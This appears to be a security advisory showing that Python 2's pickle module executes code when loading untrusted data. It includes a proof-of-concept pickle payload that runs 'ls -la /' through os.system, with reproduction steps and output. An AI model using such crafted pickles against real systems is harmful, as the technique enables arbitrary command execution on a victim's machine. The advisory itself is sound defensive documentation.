Unrestricted code execution using pickle
========================================

Classification
--------------------------

* **Affected Components** : pickle

* **Operating System** : Linux

* **Python Versions** : 2.6.x, 2.7.x

* **Reproducible** : Yes


Source code 
--------------------------

```python
import pickle

obj = pickle.load(open('./bug.pickle'))
print "== Object =="
print repr(obj)
```

AND COPY FOLLOWING TEXT INTO A FILE NAMED ```bug.pickle```

```python
cos
system
(S'ls -la /'
tR.

```

THEN PUT THIS FILE IN THE SAME FOLDEROF THE ```test.py``` FILE

Steps to Produce/Reproduce
--------------------------

To reproduce the problem copy the `source code` in a file and execute the script using the following command syntax:

```python
$ python -OOBRtt test.py
```

Alternatively you can open python in interactive mode:

```python
$ python -OOBRtt <press enter>
```
Then copy the lines of code into the interpreter.  


Description
-----------

The module ```pickle``` is not made with security in mind and can be used to execute any instruction with same permissions and  privileges as the user that is running the code.

In this case we have used ```pickle``` to load a file that contains a perfectly valid instruction that will be executed and will produce the following:

```
total 104
drwxr-xr-x  24 root root  4096 Feb 28 01:42 .
drwxr-xr-x  24 root root  4096 Feb 28 01:42 ..
drwxr-xr-x   2 root root  4096 Feb 28 01:14 bin
drwxr-xr-x   3 root root  4096 Feb 28 01:57 boot
drwxr-xr-x  14 root root  3680 May  2 14:28 dev
drwxr-xr-x 158 root root 12288 Apr 30 22:16 etc
drwxr-xr-x   3 root root  4096 Feb 28 00:45 home
lrwxrwxrwx   1 root root    30 Feb 27 23:29 initrd.img -> /boot/initrd.img-3.2.0-4-amd64
drwxr-xr-x  18 root root  4096 Feb 28 01:54 lib
drwxr-xr-x   2 root root  4096 Feb 27 23:31 lib64
drwx------   2 root root 16384 Feb 27 23:25 lost+found
drwxr-xr-x   3 root root  4096 May  2 09:18 media
drwxr-xr-x   2 root root  4096 Dec  4 12:31 mnt
drwxr-xr-x   2 root root  4096 Feb 27 23:26 opt
dr-xr-xr-x 316 root root     0 Apr 16 12:21 proc
drwx------   2 root root  4096 Mar  7 22:48 .pulse
-rw-------   1 root root   256 Feb 28 00:47 .pulse-cookie
drwx------   7 root root  4096 Mar  7 23:09 root
drwxr-xr-x  21 root root   840 May  1 00:02 run
drwxr-xr-x   2 root root  4096 Feb 28 01:55 sbin
drwxr-xr-x   2 root root  4096 Jun 10  2012 selinux
drwxr-xr-x   2 root root  4096 Feb 27 23:26 srv
drwxr-xr-x  13 root root     0 Apr 16 12:21 sys
drwxrwxrwt  13 root root  4096 May  2 14:57 tmp
drwxr-xr-x  10 root root  4096 Feb 27 23:26 usr
drwxr-xr-x  13 root root  4096 Feb 28 07:21 var
lrwxrwxrwx   1 root root    26 Feb 27 23:29 vmlinuz -> boot/vmlinuz-3.2.0-4-amd64
== Object ==
0
```

In fact ```pickle``` loaded the file and executed the code without any control.

***NEVER use ANYTHING that uses ```pickle``` or ```cPickle``` as this two libraries are NOT designed as safe/secure solution for data serialization.***


Workaround
-----------


We are not aware on any **easy** solution other than trying to avoid using ```'pickle'``` or ```'pickle'``` in cases like the one examined.


Secure Implementation
-----------


##### WORK IN PROGRESS


References
-----------

[Python pickle][01]
[01]:https://docs.python.org/2/library/pickle.html

